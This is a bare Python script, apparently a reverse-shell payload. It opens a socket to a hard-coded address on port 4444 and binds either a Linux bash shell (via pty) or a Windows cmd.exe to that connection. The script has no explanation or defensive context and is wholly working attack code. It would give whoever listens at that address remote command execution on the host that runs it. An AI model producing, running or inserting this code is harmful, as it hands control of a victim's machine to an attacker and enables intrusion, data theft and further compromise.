import platform
import socket
import subprocess
import os
import threading

operating = platform.system()
shell_ip = "10.245.240.200"
port = 4444


if operating == "Linux":
    import pty
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((shell_ip, port))
    [os.dup2(s.fileno(),f) for f in(0,1,2)]
    pty.spawn("/bin/bash")
elif operating == "Windows":
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((shell_ip, port))
    p = subprocess.Popen(["cmd.exe"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
    p.wait()


